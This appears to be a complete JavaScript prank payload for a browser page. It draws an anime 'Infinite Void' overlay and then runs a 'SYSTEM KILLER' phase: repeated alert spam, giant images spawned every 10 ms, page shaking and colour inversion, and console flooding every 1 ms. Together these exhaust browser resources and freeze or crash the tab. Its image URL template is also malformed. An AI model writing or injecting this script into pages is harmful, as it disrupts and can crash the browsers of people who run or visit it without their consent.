(function() {
    // --- PHASE 1: INFINITE VOID (5 SECOND VISUAL) ---
    const voidOverlay = document.createElement('div');
    voidOverlay.style.cssText = `
        position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
        background: rgba(48, 0, 105, 0.6); z-index: 2000000; overflow: hidden;
        display: flex; flex-direction: column; justify-content: center; align-items: center;
        pointer-events: all; backdrop-filter: blur(4px);
    `;
    
    voidOverlay.innerHTML = `
        <h1 style="color:white; font-size:100px; font-family:serif; text-shadow: 0 0 30px blue, 0 0 60px purple; margin:0;">無量空処</h1>
        <h2 style="color:white; font-size:25px; letter-spacing:10px; text-shadow: 0 0 15px purple;">INFINITE VOID</h2>
    `;
    document.body.appendChild(voidOverlay);

    // Create rushing lines toward the camera
    function createVoidLine() {
        const line = document.createElement('div');
        const angle = Math.random() * 360;
        line.style.cssText = `
            position: absolute; width: 5px; height: 1500px;
            background: linear-gradient(to top, transparent, white, purple, transparent);
            top: 50%; left: 50%; opacity: 0.9;
            transform-origin: top center;
            transform: rotate(${angle}deg) translateY(-100%);
            transition: transform 1s cubic-bezier(0.1, 0, 0.9, 1);
        `;
        voidOverlay.appendChild(line);
        
        requestAnimationFrame(() => {
            line.style.transform = `rotate(${angle}deg) translateY(200%) scale(0.1)`;
        });
        
        setTimeout(() => line.remove(), 1000);
    }

    const voidInterval = setInterval(createVoidLine, 40);

    // --- TRANSITION AFTER 5 SECONDS ---
    setTimeout(() => {
        clearInterval(voidInterval);
        voidOverlay.remove();
        
        // --- PHASE 2: THE "SYSTEM KILLER" SCRIPT (YOUR ORIGINAL) ---
        (function() {
            // 1. ALERT SPAM
            for(let i=0; i<3; i++) alert("!!! WARNING: VRAM OVERFLOW !!!");

            // 2. THE "SYSTEM KILLER" SPAWNER
            function spawnMegaImage() {
                const img = new Image();
                const size = Math.floor(Math.random() * 1500) + 1500; 
                img.src = `https://picsum.photos{size}/${size}?random=${Math.random()}`;
                
                img.style.cssText = `
                    position: fixed; top: ${Math.random() * 100}vh; left: ${Math.random() * 100}vw;
                    width: ${size}px; z-index: 999999; pointer-events: none;
                    filter: contrast(2) saturate(3) blur(1px) drop-shadow(0 0 50px blue);
                    transition: transform 3s cubic-bezier(0.1, 0, 0.9, 1);
                    transform: translate(-50%, -50%) scale(0.01) rotate(0deg);
                `;
                document.body.appendChild(img);

                requestAnimationFrame(() => {
                    img.style.transform = `translate(-50%, -50%) scale(8) rotate(${Math.random() * 5000}deg)`;
                    img.style.opacity = '0.8';
                });
            }

            // 3. THE HYPER-LOOP (10ms)
            setInterval(() => {
                spawnMegaImage();
                document.body.style.transform = `translate(${(Math.random()-0.5)*300}px, ${(Math.random()-0.5)*300}px) rotate(${(Math.random()-0.5)*10}deg)`;
                document.documentElement.style.filter = `invert(${Math.random() > 0.5 ? 100 : 0}%) hue-rotate(${Math.random() * 240}deg)`;
                document.title = "VOID_OVERLOAD_" + Math.random().toString(16).toUpperCase();
            }, 10);

            // 4. CONSOLE FLOODING
            setInterval(() => {
                console.error("FATAL ERROR: INFINITE DATA STREAMING");
            }, 1);
        })();
    }, 5000);
})();
